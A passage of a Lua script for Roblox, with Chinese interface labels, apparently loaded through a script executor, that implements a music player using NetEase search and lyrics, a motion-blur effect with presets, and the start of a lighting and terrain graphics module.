            if currentSongIndex and _G.MusicPlayerData.songHistory[currentSongIndex] then
                local songId = _G.MusicPlayerData.songHistory[currentSongIndex].songId
                local isFav = false
                for _, fav in ipairs(_G.MusicPlayerData.favorites) do
                    if fav.id == songId then
                        isFav = true
                        break
                    end
                end
                currentFavoriteLabel.Text = "收藏状态: " .. (isFav and "已收藏" or "未收藏")
            else
                currentFavoriteLabel.Text = "收藏状态: 未收藏"
            end
        end
    end
    
    local function updateFavoritesDropdown()
        local favNames = {}
        for _, fav in ipairs(_G.MusicPlayerData.favorites) do
            table.insert(favNames, fav.name)
        end
        if #favNames == 0 then
            table.insert(favNames, "暂无收藏")
        end
        
        if favoritesDropdown then
            pcall(function()
                about:SetDropdownOptions("FavoritesDropdown", favNames)
            end)
        end
    end
    
    local function updatePlayModeLabel()
        if not playModeLabel then
            playModeLabel = about:Label("当前模式: 顺序播放")
        else
            local modeText = "顺序播放"
            if _G.MusicPlayerData.loopMode == "single" then
                modeText = "单曲循环"
            elseif _G.MusicPlayerData.loopMode == "auto" then
                modeText = "自动下一首"
            end
            playModeLabel.Text = "当前模式: " .. modeText
        end
    end
    
    local function fetchLyrics(songId)
        if not _G.LyricsModule.enabled then return end
        
        _G.LyricsModule.setCurrentSongId(songId)
        currentSongId = songId
        
        local lyricUrl = "http://music.163.com/api/song/lyric?id=" .. songId .. "&lv=1&kv=1&tv=-1"
        local success, response = pcall(function()
            return game:HttpGet(lyricUrl)
        end)
        
        if success and response then
            local success, data = pcall(function()
                return game:GetService("HttpService"):JSONDecode(response)
            end)
            
            if success and data and data.lrc and data.lrc.lyric then
                local lyricText = data.lrc.lyric
                local lyrics = {}
                
                for line in string.gmatch(lyricText, "[^\r\n]+") do
                    local minutes, seconds, text = string.match(line, "%[(%d+):(%d+%.?%d*)%](.*)")
                    if minutes and seconds and text and text ~= "" then
                        local totalSeconds = tonumber(minutes) * 60 + tonumber(seconds)
                        table.insert(lyrics, {
                            time = totalSeconds,
                            text = text
                        })
                    end
                end
                
                table.sort(lyrics, function(a, b) return a.time < b.time end)
                _G.LyricsModule.setLyrics(lyrics)
                
                if #lyrics > 0 then
                    NotificationLibrary:SendNotification("Success", "歌词加载成功，共 " .. #lyrics .. " 行", 2)
                else
                    NotificationLibrary:SendNotification("Info", "该歌曲暂无歌词", 2)
                end
            else
                _G.LyricsModule.setLyrics({})
                NotificationLibrary:SendNotification("Info", "该歌曲暂无歌词", 2)
            end
        else
            _G.LyricsModule.setLyrics({})
            NotificationLibrary:SendNotification("Error", "歌词获取失败", 2)
        end
    end
    
    local function playNext(auto)
        if #_G.MusicPlayerData.songHistory == 0 then return end
        
        if _G.MusicPlayerData.loopMode == "single" then
            local currentSong = _G.MusicPlayerData.songHistory[currentSongIndex]
            playSong(currentSong.songId, currentSong.soundId, currentSong.songName)
            if auto then
                NotificationLibrary:SendNotification("Info", "单曲循环中", 1)
            end
        elseif _G.MusicPlayerData.loopMode == "auto" then
            if currentSongIndex < #_G.MusicPlayerData.songHistory then
                local nextSong = _G.MusicPlayerData.songHistory[currentSongIndex + 1]
                playSong(nextSong.songId, nextSong.soundId, nextSong.songName)
                currentSongIndex = currentSongIndex + 1
            else
                NotificationLibrary:SendNotification("Info", "已播放完所有歌曲", 2)
            end
        end
    end
    
    local function playSong(songId, soundId, songName, startPosition)
        if currentSound then
            currentSound:Stop()
            currentSound = nil
        end
        
        stopCountdown()
        _G.LyricsModule.setLyrics({})
        
        local Sound = Instance.new("Sound")
        Sound.SoundId = soundId
        Sound.Parent = game.Workspace
        Sound.Volume = _G.MusicPlayerData.volume / 100
        
        if startPosition then
            Sound.TimePosition = startPosition
        end
        
        Sound:Play()
        currentSound = Sound
        _G.CurrentSound = Sound
        
        currentSongId = songId
        _G.LyricsModule.setCurrentSongId(songId)
        
        task.wait(0.1)
        
        if _G.LyricsModule.enabled then
            fetchLyrics(songId)
        end
        
        local currentTime = os.time()
        local startTime = os.date("%Y-%m-%d %H:%M:%S", currentTime)
        local totalTime = Sound.TimeLength
        local endTime = os.date("%Y-%m-%d %H:%M:%S", currentTime + totalTime)
        
        savedStartTime = startTime
        savedEndTime = endTime
        
        if not currentSongNameLabel then
            currentSongNameLabel = about:Label("当前歌曲: " .. songName)
        else
            currentSongNameLabel.Text = "当前歌曲: " .. songName
        end
        
        if not countdownLabel then
            countdownLabel = about:Label("倒计时: 00:00")
        end
        
        if not progressLabel then
            progressLabel = about:Label("播放进度: 00:00 / 00:00")
        end
        
        if not startTimeLabel then
            startTimeLabel = about:Label("开始时间: " .. startTime)
        else
            startTimeLabel.Text = "开始时间: " .. startTime
        end
        
        if not endTimeLabel then
            endTimeLabel = about:Label("结束时间: " .. endTime)
        else
            endTimeLabel.Text = "结束时间: " .. endTime
        end
        
        if not playCountLabel then
            playCountLabel = about:Label("历史播放次数: " .. _G.MusicPlayerData.playCount)
        else
            playCountLabel.Text = "历史播放次数: " .. _G.MusicPlayerData.playCount
        end
        
        updateFavoriteStatus()
        
        if _G.LyricsModule.enabled and not lyricsFrame then
            _G.LyricsModule.createDisplay(true, true)
        end
        
        isPlaying = true
        countdownTask = game:GetService("RunService").Heartbeat:Connect(function()
            if currentSound and currentSound.Playing then
                local currentTimeRemaining = math.max(0, Sound.TimeLength - Sound.TimePosition)
                local minutesRemaining = math.floor(currentTimeRemaining / 60)
                local secondsRemaining = math.floor(currentTimeRemaining % 60)
                
                countdownLabel.Text = string.format("倒计时: %02d:%02d", minutesRemaining, secondsRemaining)
                
                local currentMinutes = math.floor(Sound.TimePosition / 60)
                local currentSeconds = math.floor(Sound.TimePosition % 60)
                local totalMinutes = math.floor(Sound.TimeLength / 60)
                local totalSeconds = math.floor(Sound.TimeLength % 60)
                
                progressLabel.Text = string.format("播放进度: %02d:%02d / %02d:%02d", currentMinutes, currentSeconds, totalMinutes, totalSeconds)
                endTimeLabel.Text = "结束时间: " .. os.date("%Y-%m-%d %H:%M:%S", currentTime + Sound.TimeLength)
            else
                if isPlaying and _G.MusicPlayerData.loopMode ~= "none" then
                    playNext(true)
                else
                    stopCountdown()
                end
            end
        end)
        
        if _G.LyricsModule.enabled then
            _G.LyricsModule.startUpdateTask()
        end
        
        NotificationLibrary:SendNotification("Success", "正在播放: " .. songName, 3)
    end
    
    about:Label("══════════ 搜索歌曲 ══════════")
    
    about:Textbox("请输入歌曲名称", "", "输入歌曲名称后按回车", function(s)
        local encodedSongName = urlEncode(s)
        local url = "https://music.163.com/api/search/get?s=" .. encodedSongName .. "&type=1&limit=100"
        local response = game:HttpGet(url)
        local data = game:GetService("HttpService"):JSONDecode(response)
        
        if not searchSongNameLabel then
            searchSongNameLabel = about:Label("当前搜索: " .. s)
        else
            searchSongNameLabel.Text = "当前搜索: " .. s
        end
        
        if data.result and #data.result.songs > 0 then
            songList = {}
            for _, song in pairs(data.result.songs) do
                table.insert(songList, song.name .. " - " .. song.artists[1].name)
            end
            
            searchResultsCount = #songList
            
            about:Dropdown("选择歌曲", "请选择一个歌曲", songList, function(selectedSong)
                NotificationLibrary:SendNotification("Info", "已选择: " .. selectedSong, 3)
                
                local songId = data.result.songs[table.find(songList, selectedSong)].id
                local soundId = _G.MusicPlayerData.downloadSong(songId, selectedSong)
                
                if soundId then
                    table.insert(_G.MusicPlayerData.songHistory, {songId = songId, soundId = soundId, songName = selectedSong})
                    currentSongIndex = #_G.MusicPlayerData.songHistory
                    
                    _G.MusicPlayerData.playCount = _G.MusicPlayerData.playCount + 1
                    
                    playSong(songId, soundId, selectedSong)
                else
                    NotificationLibrary:SendNotification("Error", "歌曲下载失败", 3)
                end
            end)
        else
            searchResultsCount = 0
            NotificationLibrary:SendNotification("Error", "未找到相关歌曲", 3)
        end
        
        if not searchResultsLabel then
            searchResultsLabel = about:Label("搜索结果数量: " .. (searchResultsCount or "nil"))
        else
            searchResultsLabel.Text = "搜索结果数量: " .. (searchResultsCount or "nil")
        end
        
        _G.MusicPlayerData.searchHistoryCount = _G.MusicPlayerData.searchHistoryCount + 1
        
        if not searchHistoryCountLabel then
            searchHistoryCountLabel = about:Label("历史搜索次数: " .. _G.MusicPlayerData.searchHistoryCount)
        else
            searchHistoryCountLabel.Text = "历史搜索次数: " .. _G.MusicPlayerData.searchHistoryCount
        end
    end)
    
    about:Label("══════════ 歌词设置 ══════════")
    
    about:Toggle("显示屏幕歌词", "LyricsEnabled", false, function(Value)
        _G.LyricsModule.enabled = Value
        if Value then
            if not lyricsFrame then
                _G.LyricsModule.createDisplay(true, true)
            else
                _G.LyricsModule.setVisible(true)
            end
            
            if currentSound and currentSound.Playing and currentSongId then
                fetchLyrics(currentSongId)
                _G.LyricsModule.startUpdateTask()
            end
        else
            _G.LyricsModule.setVisible(false)
            _G.LyricsModule.stopUpdateTask()
        end
        _G.LyricsModule.saveState()
        NotificationLibrary:SendNotification("Info", "屏幕歌词 " .. (Value and "已开启" or "已关闭"), 2)
    end)
    
    about:Toggle("锁定歌词位置", "LyricsLocked", false, function(Value)
        _G.LyricsModule.locked = Value
        _G.LyricsModule.updateDraggable()
        _G.LyricsModule.saveState()
        NotificationLibrary:SendNotification("Info", "歌词位置 " .. (Value and "已锁定" or "已解锁"), 2)
    end)
    
    about:Slider("歌词文字大小", "LyricsSize", 24, 12, 48, false, function(Value)
        _G.LyricsModule.size = Value
        _G.LyricsModule.updateSize(Value)
        _G.LyricsModule.saveState()
    end)
    
    about:Dropdown("第一行歌词颜色", "LyricsColor1", {"浅蓝","白色","红色","蓝色","绿色","黄色","青色","紫色","橙色","粉色"}, function(Value)
        _G.LyricsModule.color1 = _G.ColorMap[Value]
        _G.LyricsModule.updateColors(_G.ColorMap[Value], nil)
        _G.LyricsModule.saveState()
    end)
    
    about:Dropdown("第二行歌词颜色", "LyricsColor2", {"白色","红色","蓝色","绿色","黄色","青色","紫色","橙色","粉色","浅蓝"}, function(Value)
        _G.LyricsModule.color2 = _G.ColorMap[Value]
        _G.LyricsModule.updateColors(nil, _G.ColorMap[Value])
        _G.LyricsModule.saveState()
    end)
    
    about:Button("重置歌词位置", function()
        _G.LyricsModule.resetPosition()
        _G.LyricsModule.saveState()
        NotificationLibrary:SendNotification("Success", "歌词位置已重置", 2)
    end)
    
    about:Label("══════════ 音量设置 ══════════")
    
    about:Slider("音量调节", "VolumeSlider", _G.MusicPlayerData.volume, 1, 100, false, function(Value)
        setVolume(Value)
    end)
    
    volumeLabel = about:Label("当前音量: " .. _G.MusicPlayerData.volume .. "%")
    
    about:Label("══════════ 收藏歌曲 ══════════")
    
    about:Button("收藏当前歌曲", function()
        if currentSongIndex and _G.MusicPlayerData.songHistory[currentSongIndex] then
            local currentSong = _G.MusicPlayerData.songHistory[currentSongIndex]
            local isFav = false
            
            for _, fav in ipairs(_G.MusicPlayerData.favorites) do
                if fav.id == currentSong.songId then
                    isFav = true
                    break
                end
            end
            
            if not isFav then
                local soundId = _G.MusicPlayerData.downloadSong(currentSong.songId, currentSong.songName)
                if soundId then
                    table.insert(_G.MusicPlayerData.favorites, {
                        id = currentSong.songId,
                        name = currentSong.songName,
                        soundId = soundId
                    })
                    _G.MusicPlayerData.saveFavorites()
                    updateFavoritesDropdown()
                    updateFavoriteStatus()
                    NotificationLibrary:SendNotification("Success", "已收藏: " .. currentSong.songName, 2)
                else
                    NotificationLibrary:SendNotification("Error", "歌曲文件保存失败", 2)
                end
            else
                NotificationLibrary:SendNotification("Info", "该歌曲已在收藏列表中", 2)
            end
        else
            NotificationLibrary:SendNotification("Error", "没有正在播放的歌曲", 2)
        end
    end)
    
    about:Button("取消收藏当前歌曲", function()
        if currentSongIndex and _G.MusicPlayerData.songHistory[currentSongIndex] then
            local currentSong = _G.MusicPlayerData.songHistory[currentSongIndex]
            local favIndex = nil
            
            for i, fav in ipairs(_G.MusicPlayerData.favorites) do
                if fav.id == currentSong.songId then
                    favIndex = i
                    break
                end
            end
            
            if favIndex then
                table.remove(_G.MusicPlayerData.favorites, favIndex)
                _G.MusicPlayerData.saveFavorites()
                updateFavoritesDropdown()
                updateFavoriteStatus()
                NotificationLibrary:SendNotification("Success", "已取消收藏: " .. currentSong.songName, 2)
            else
                NotificationLibrary:SendNotification("Info", "该歌曲不在收藏列表中", 2)
            end
        else
            NotificationLibrary:SendNotification("Error", "没有正在播放的歌曲", 2)
        end
    end)
    
    local function getFavoriteNames()
        local names = {}
        for _, fav in ipairs(_G.MusicPlayerData.favorites) do
            table.insert(names, fav.name)
        end
        if #names == 0 then
            return {"暂无收藏"}
        end
        return names
    end
    
    favoritesDropdown = about:Dropdown("选择收藏歌曲", "FavoritesDropdown", getFavoriteNames(), function(selectedSong)
        if selectedSong == "暂无收藏" then return end
        
        for _, fav in ipairs(_G.MusicPlayerData.favorites) do
            if fav.name == selectedSong then
                playSong(fav.id, fav.soundId, fav.name)
                break
            end
        end
    end)
    
    currentFavoriteLabel = about:Label("收藏状态: 未收藏")
    
    about:Label("══════════ 播放模式 ══════════")
    
    about:Toggle("单曲循环", "SingleLoop", false, function(Value)
        if Value then
            _G.MusicPlayerData.loopMode = "single"
            for _, v in pairs(getgenv().aboutToggles or {}) do
                if v.Name == "AutoNext" then
                    v:SetState(false)
                end
            end
        elseif _G.MusicPlayerData.loopMode == "single" then
            _G.MusicPlayerData.loopMode = "none"
        end
        updatePlayModeLabel()
    end)
    
    about:Toggle("自动下一首", "AutoNext", false, function(Value)
        if Value then
            _G.MusicPlayerData.loopMode = "auto"
            for _, v in pairs(getgenv().aboutToggles or {}) do
                if v.Name == "SingleLoop" then
                    v:SetState(false)
                end
            end
        elseif _G.MusicPlayerData.loopMode == "auto" then
            _G.MusicPlayerData.loopMode = "none"
        end
        updatePlayModeLabel()
    end)
    
    about:Label("══════════ 控制区域 ══════════")
    
    about:Button("继续播放音乐", function()
        if currentSongIndex then
            local song = _G.MusicPlayerData.songHistory[currentSongIndex]
            if savedStartTime and savedEndTime then
                playSong(song.songId, song.soundId, song.songName, lastPosition)
                startTimeLabel.Text = "开始时间: " .. savedStartTime
                endTimeLabel.Text = "结束时间: " .. savedEndTime
                NotificationLibrary:SendNotification("Success", "音乐继续播放", 2)
            else
                NotificationLibrary:SendNotification("Error", "没有保存的开始时间和结束时间", 2)
            end
        else
            NotificationLibrary:SendNotification("Error", "没有歌曲可以继续播放", 2)
        end
    end)
    
    about:Button("重新播放音乐", function()
        if currentSound then
            currentSound:Play()
            isPlaying = true
            local song = _G.MusicPlayerData.songHistory[currentSongIndex]
            playSong(song.songId, song.soundId, song.songName)
            NotificationLibrary:SendNotification("Success", "音乐重新播放", 2)
        else
            NotificationLibrary:SendNotification("Error", "没有正在播放的歌曲", 2)
        end
    end)
    
    about:Button("开始播放音乐", function()
        if not isPlaying and currentSongIndex then
            local song = _G.MusicPlayerData.songHistory[currentSongIndex]
            playSong(song.songId, song.soundId, song.songName)
            NotificationLibrary:SendNotification("Success", "音乐开始播放", 2)
        else
            NotificationLibrary:SendNotification("Error", "没有歌曲可播放", 2)
        end
    end)
    
    about:Button("停止播放音乐", function()
        if currentSound then
            lastPosition = currentSound.TimePosition
            currentSound:Stop()
            isPlaying = false
            stopCountdown()
            NotificationLibrary:SendNotification("Success", "音乐停止播放", 2)
        else
            NotificationLibrary:SendNotification("Error", "没有正在播放的歌曲", 2)
        end
    end)
    
    about:Label("══════════ 切换区域 ══════════")
    
    about:Button("上一首音乐", function()
        if #_G.MusicPlayerData.songHistory > 1 and currentSongIndex > 1 then
            local previousSong = _G.MusicPlayerData.songHistory[currentSongIndex - 1]
            playSong(previousSong.songId, previousSong.soundId, previousSong.songName)
            currentSongIndex = currentSongIndex - 1
            NotificationLibrary:SendNotification("Success", "播放上一首: " .. previousSong.songName, 2)
        else
            NotificationLibrary:SendNotification("Error", "没有上一首歌曲", 2)
        end
    end)
    
    about:Button("下一首音乐", function()
        if #_G.MusicPlayerData.songHistory > currentSongIndex and currentSongIndex < #_G.MusicPlayerData.songHistory then
            local nextSong = _G.MusicPlayerData.songHistory[currentSongIndex + 1]
            playSong(nextSong.songId, nextSong.soundId, nextSong.songName)
            currentSongIndex = currentSongIndex + 1
            NotificationLibrary:SendNotification("Success", "播放下一首: " .. nextSong.songName, 2)
        else
            NotificationLibrary:SendNotification("Error", "没有下一首歌曲", 2)
        end
    end)
    
    updatePlayModeLabel()
end)

run(function()
    local Players = game:GetService("Players")
    local LocalPlayer = Players.LocalPlayer
    local RunService = game:GetService("RunService")
    
    LocalPlayer.CharacterAdded:Connect(function(character)
        if _G.LyricsModule then
            _G.LyricsModule.saveState()
        end
        
        local currentSoundBackup = _G.CurrentSound
        local currentSongIdBackup = currentSongId
        
        task.wait(0.5)
        
        _G.CurrentSound = currentSoundBackup
        
        if _G.CurrentSound and _G.CurrentSound.Playing then
            if _G.LyricsModule and _G.LyricsModule.enabled then
                _G.LyricsModule.stopUpdateTask()
                task.wait(0.1)
                _G.LyricsModule.startUpdateTask()
            end
        end
        
        if _G.LyricsModule then
            _G.LyricsModule.restoreState()
        end
    end)
    
    _G.RestoreLyrics = function()
        if _G.LyricsModule then
            _G.LyricsModule.restoreState()
        end
    end
    
    task.wait(1)
    if _G.LyricsModule and _G.LyricsModule.enabled and not lyricsFrame then
        _G.LyricsModule.createDisplay(true, true)
    end
end)

local PIJIAOBEN = XIAOPI:Tab("画质光影","136169594232359")

local Light = PIJIAOBEN:section("模糊", false)

local run = function(func) func() end

run(function()
    _G.MotionBlurConfig = {
        enabled = false,
        amount = 15,
        amplifier = 5,
        smoothness = 0.15,
        threshold = 0.05,
        duration = 1,
        direction = Vector2.new(1, 0),
        area = {0, 0, 1, 1},
        
        effect = nil,
        lastVector = Vector3.zero,
        currentType = "运动模糊",
        types = {"运动模糊", "径向模糊", "方向模糊", "缩放模糊"},
        lastUpdateTime = 0,
        velocityBuffer = {},
        
        presets = {
            {name = "默认", amount = 15, amplifier = 5, smoothness = 0.15, threshold = 0.05},
            {name = "强烈", amount = 25, amplifier = 10, smoothness = 0.05, threshold = 0.02},
            {name = "柔和", amount = 8, amplifier = 3, smoothness = 0.2, threshold = 0.1},
            {name = "电影级", amount = 20, amplifier = 8, smoothness = 0.1, threshold = 0.03}
        }
    }
end)

run(function()
    _G.MotionBlurServices = {
        Workspace = game:GetService("Workspace"),
        RunService = game:GetService("RunService")
    }
    
    _G.MotionBlurUtils = {
        getCamera = function()
            return _G.MotionBlurServices.Workspace.CurrentCamera
        end
    }
end)

run(function()
    local MotionBlurConfig = _G.MotionBlurConfig
    local getCamera = _G.MotionBlurUtils.getCamera
    
    _G.MotionBlurEffect = {
        createBlurEffect = function(camera, blurType)
            if not camera then return nil end
            
            local effect = nil
            
            if blurType == "运动模糊" or blurType == "方向模糊" then
                effect = Instance.new("BlurEffect")
                effect.Size = 0
                
            elseif blurType == "径向模糊" then
                effect = Instance.new("SunRaysEffect")
                effect.Intensity = 0
                effect.Spread = 0.5
                
            elseif blurType == "缩放模糊" then
                effect = Instance.new("DepthOfFieldEffect")
                effect.FarIntensity = 0
                effect.NearIntensity = 0
                effect.InFocusRadius = 1
            end
            
            if effect then
                effect.Name = "MotionBlur_" .. blurType
                effect.Parent = camera
            end
            
            return effect
        end,
        
        updateBlurEffect = function(effect, blurType, intensity)
            if not effect then return end
            
            if blurType == "运动模糊" or blurType == "方向模糊" then
                effect.Size = intensity
                
            elseif blurType == "径向模糊" then
                effect.Intensity = math.min(intensity / 10, 1)
                
            elseif blurType == "缩放模糊" then
                local depthIntensity = math.min(intensity / 15, 1)
                effect.FarIntensity = depthIntensity
                effect.NearIntensity = depthIntensity
            end
        end,
        
        setupBlur = function()
            local camera = getCamera()
            
            if MotionBlurConfig.effect then
                MotionBlurConfig.effect:Destroy()
                MotionBlurConfig.effect = nil
            end
            
            if MotionBlurConfig.enabled and camera then
                MotionBlurConfig.effect = _G.MotionBlurEffect.createBlurEffect(camera, MotionBlurConfig.currentType)
            end
        end,
        
        calculateMotionIntensity = function(currentVector, deltaTime)
            if deltaTime <= 0 then return 0 end
            
            local velocity = (currentVector - MotionBlurConfig.lastVector) / deltaTime
            local speed = velocity.Magnitude
            
            table.insert(MotionBlurConfig.velocityBuffer, speed)
            if #MotionBlurConfig.velocityBuffer > 5 then
                table.remove(MotionBlurConfig.velocityBuffer, 1)
            end
            
            local avgSpeed = 0
            for _, v in ipairs(MotionBlurConfig.velocityBuffer) do
                avgSpeed = avgSpeed + v
            end
            avgSpeed = avgSpeed / #MotionBlurConfig.velocityBuffer
            
            return avgSpeed
        end,
        
        updateBlur = function(deltaTime)
            if not MotionBlurConfig.enabled then 
                if MotionBlurConfig.effect then
                    _G.MotionBlurEffect.updateBlurEffect(MotionBlurConfig.effect, MotionBlurConfig.currentType, 0)
                end
                return 
            end
            
            local camera = getCamera()
            if not camera or not MotionBlurConfig.effect then 
                _G.MotionBlurEffect.setupBlur()
                return 
            end
            
            local currentVector = camera.CFrame.LookVector
            
            local motionIntensity = _G.MotionBlurEffect.calculateMotionIntensity(currentVector, deltaTime)
            
            if motionIntensity > MotionBlurConfig.threshold then
                local directionalFactor = math.abs(MotionBlurConfig.direction.X) + math.abs(MotionBlurConfig.direction.Y)
                directionalFactor = math.max(directionalFactor, 0.5)
                
                local targetIntensity = math.min(
                    motionIntensity * MotionBlurConfig.amount * MotionBlurConfig.amplifier * directionalFactor,
                    MotionBlurConfig.duration * 30
                )
                
                local currentSize = 0
                if MotionBlurConfig.currentType == "运动模糊" or MotionBlurConfig.currentType == "方向模糊" then
                    currentSize = MotionBlurConfig.effect.Size
                elseif MotionBlurConfig.currentType == "径向模糊" then
                    currentSize = MotionBlurConfig.effect.Intensity * 10
                elseif MotionBlurConfig.currentType == "缩放模糊" then
                    currentSize = (MotionBlurConfig.effect.FarIntensity + MotionBlurConfig.effect.NearIntensity) * 7.5
                end
                
                local newIntensity = currentSize + (targetIntensity - currentSize) * MotionBlurConfig.smoothness
                _G.MotionBlurEffect.updateBlurEffect(MotionBlurConfig.effect, MotionBlurConfig.currentType, newIntensity)
                
            else
                local currentSize = 0
                if MotionBlurConfig.currentType == "运动模糊" or MotionBlurConfig.currentType == "方向模糊" then
                    currentSize = MotionBlurConfig.effect.Size
                elseif MotionBlurConfig.currentType == "径向模糊" then
                    currentSize = MotionBlurConfig.effect.Intensity * 10
                elseif MotionBlurConfig.currentType == "缩放模糊" then
                    currentSize = (MotionBlurConfig.effect.FarIntensity + MotionBlurConfig.effect.NearIntensity) * 7.5
                end
                
                local newIntensity = currentSize * (1 - MotionBlurConfig.smoothness * 2)
                _G.MotionBlurEffect.updateBlurEffect(MotionBlurConfig.effect, MotionBlurConfig.currentType, newIntensity)
            end
            
            MotionBlurConfig.lastVector = currentVector
            MotionBlurConfig.lastUpdateTime = tick()
        end,
        
        cleanup = function()
            if MotionBlurConfig.effect then
                MotionBlurConfig.effect:Destroy()
                MotionBlurConfig.effect = nil
            end
            MotionBlurConfig.enabled = false
        end
    }
end)

run(function()
    local Workspace = _G.MotionBlurServices.Workspace
    local RunService = _G.MotionBlurServices.RunService
    local getCamera = _G.MotionBlurUtils.getCamera
    
    Workspace:GetPropertyChangedSignal("CurrentCamera"):Connect(function()
        if _G.MotionBlurConfig.enabled then
            _G.MotionBlurEffect.setupBlur()
        end
    end)
    
    local heartbeat = RunService.Heartbeat:Connect(function(deltaTime)
        _G.MotionBlurEffect.updateBlur(deltaTime)
    end)
    
    task.wait(0.1)
    if getCamera() then
        _G.MotionBlurEffect.setupBlur()
    end
end)

run(function()
    local MotionBlurConfig = _G.MotionBlurConfig
    
    local presetNames = {}
    for _, preset in ipairs(MotionBlurConfig.presets) do
        table.insert(presetNames, preset.name)
    end
    
    Light:Dropdown("模糊类型", "选择模糊效果类型", MotionBlurConfig.types, function(type)
        MotionBlurConfig.currentType = type
        if MotionBlurConfig.enabled then
            _G.MotionBlurEffect.setupBlur()
        end
    end)
    
    Light:Dropdown("预设配置", "快速应用预设配置", presetNames, function(presetName)
        for _, preset in ipairs(MotionBlurConfig.presets) do
            if preset.name == presetName then
                MotionBlurConfig.amount = preset.amount
                MotionBlurConfig.amplifier = preset.amplifier
                MotionBlurConfig.smoothness = preset.smoothness
                MotionBlurConfig.threshold = preset.threshold
                break
            end
        end
    end)
    
    Light:Toggle("启用模糊", "开启/关闭动态模糊效果", false, function(state)
        MotionBlurConfig.enabled = state
        if state then
            MotionBlurConfig.velocityBuffer = {}
            MotionBlurConfig.lastVector = _G.MotionBlurUtils.getCamera() and _G.MotionBlurUtils.getCamera().CFrame.LookVector or Vector3.zero
            _G.MotionBlurEffect.setupBlur()
        else
            if MotionBlurConfig.effect then
                _G.MotionBlurEffect.updateBlurEffect(MotionBlurConfig.effect, MotionBlurConfig.currentType, 0)
            end
        end
    end)
    
    Light:Slider("模糊强度", "控制模糊效果强度", 1, 50, MotionBlurConfig.amount, false, function(value)
        MotionBlurConfig.amount = value
    end)
    
    Light:Slider("模糊放大器", "放大运动对模糊的影响", 1, 20, MotionBlurConfig.amplifier, false, function(value)
        MotionBlurConfig.amplifier = value
    end)
    
    Light:Slider("模糊平滑度", "控制模糊过渡平滑度", 0.01, 1, MotionBlurConfig.smoothness, false, function(value)
        MotionBlurConfig.smoothness = value
    end)
    
    Light:Slider("模糊敏感度", "控制运动检测敏感度", 0.01, 1, MotionBlurConfig.threshold, false, function(value)
        MotionBlurConfig.threshold = value
    end)
    
    Light:Slider("模糊持续时间", "控制模糊效果持续时间", 0.1, 5, MotionBlurConfig.duration, false, function(value)
        MotionBlurConfig.duration = value
    end)
    
    Light:Slider("方向X", "设置模糊X轴方向", -1, 1, MotionBlurConfig.direction.X, false, function(value)
        MotionBlurConfig.direction = Vector2.new(value, MotionBlurConfig.direction.Y)
    end)
    
    Light:Slider("方向Y", "设置模糊Y轴方向", -1, 1, MotionBlurConfig.direction.Y, false, function(value)
        MotionBlurConfig.direction = Vector2.new(MotionBlurConfig.direction.X, value)
    end)
    
    Light:Slider("区域X1", "设置模糊区域左上角X", 0, 1, MotionBlurConfig.area[1], false, function(value)
        MotionBlurConfig.area[1] = value
    end)
    
    Light:Slider("区域Y1", "设置模糊区域左上角Y", 0, 1, MotionBlurConfig.area[2], false, function(value)
        MotionBlurConfig.area[2] = value
    end)
    
    Light:Slider("区域X2", "设置模糊区域右下角X", 0, 1, MotionBlurConfig.area[3], false, function(value)
        MotionBlurConfig.area[3] = value
    end)
    
    Light:Slider("区域Y2", "设置模糊区域右下角Y", 0, 1, MotionBlurConfig.area[4], false, function(value)
        MotionBlurConfig.area[4] = value
    end)
end)

local run = function(func) func() end

run(function()
    local Graphics = {
        enabled = false,
        mode = "春季",
        terrainEnabled = false,
        colorCorrectionEnabled = false,
        sunEnabled = false,
        lightingEnabled = false,
        bloomEnabled = false,
        depthOfFieldEnabled = false,
        blurEnabled = false
    }
    
    local originalLighting = {
        Ambient = nil,
        Brightness = nil,
        ColorShift_Bottom = nil,
        ColorShift_Top = nil,
        ExposureCompensation = nil,
        FogColor = nil,
        GlobalShadows = nil,
        OutdoorAmbient = nil,
        Outlines = nil,
        EnvironmentDiffuseScale = nil,
        EnvironmentSpecularScale = nil,
        ShadowSoftness = nil,
        GeographicLatitude = nil
    }
    
    local originalTerrain = {
        WaterWaveSize = nil,
        WaterWaveSpeed = nil,
        WaterTransparency = nil,
        WaterReflectance = nil
    }
    
    local lighting = game:GetService("Lighting")
    local terrain = workspace:FindFirstChild("Terrain") or workspace.Terrain
    
    local effects = {}
    local effectsList = {}
    
    local function saveOriginalSettings()
        originalLighting.Ambient = lighting.Ambient
        originalLighting.Brightness = lighting.Brightness
        originalLighting.ColorShift_Bottom = lighting.ColorShift_Bottom
        originalLighting.ColorShift_Top = lighting.ColorShift_Top
        originalLighting.ExposureCompensation = lighting.ExposureCompensation
        originalLighting.FogColor = lighting.FogColor
        originalLighting.GlobalShadows = lighting.GlobalShadows
        originalLighting.OutdoorAmbient = lighting.OutdoorAmbient
        originalLighting.Outlines = lighting.Outlines
        originalLighting.EnvironmentDiffuseScale = lighting.EnvironmentDiffuseScale
        originalLighting.EnvironmentSpecularScale = lighting.EnvironmentSpecularScale
        originalLighting.ShadowSoftness = lighting.ShadowSoftness
        originalLighting.GeographicLatitude = lighting.GeographicLatitude
        
        if terrain then
            originalTerrain.WaterWaveSize = terrain.WaterWaveSize
            originalTerrain.WaterWaveSpeed = terrain.WaterWaveSpeed
            originalTerrain.WaterTransparency = terrain.WaterTransparency
            originalTerrain.WaterReflectance = terrain.WaterReflectance
        end
    end
    
    local function restoreOriginalSettings()
        lighting.Ambient = originalLighting.Ambient
        lighting.Brightness = originalLighting.Brightness
        lighting.ColorShift_Bottom = originalLighting.ColorShift_Bottom
        lighting.ColorShift_Top = originalLighting.ColorShift_Top
        lighting.ExposureCompensation = originalLighting.ExposureCompensation
        lighting.FogColor = originalLighting.FogColor
        lighting.GlobalShadows = originalLighting.GlobalShadows
        lighting.OutdoorAmbient = originalLighting.OutdoorAmbient
        lighting.Outlines = originalLighting.Outlines
        lighting.EnvironmentDiffuseScale = originalLighting.EnvironmentDiffuseScale
        lighting.EnvironmentSpecularScale = originalLighting.EnvironmentSpecularScale
        lighting.ShadowSoftness = originalLighting.ShadowSoftness
        lighting.GeographicLatitude = originalLighting.GeographicLatitude
        
        if terrain then
            terrain.WaterWaveSize = originalTerrain.WaterWaveSize
            terrain.WaterWaveSpeed = originalTerrain.WaterWaveSpeed
            terrain.WaterTransparency = originalTerrain.WaterTransparency
            terrain.WaterReflectance = originalTerrain.WaterReflectance
        end
    end
    
    local function clearEffects()
        for _, effect in ipairs(effectsList) do
            if effect and effect.Parent then
                effect:Destroy()
            end
        end
        effectsList = {}
        effects = {}
    end
    
    local function getSeasonTintColor(season)
        if season == "春季" then
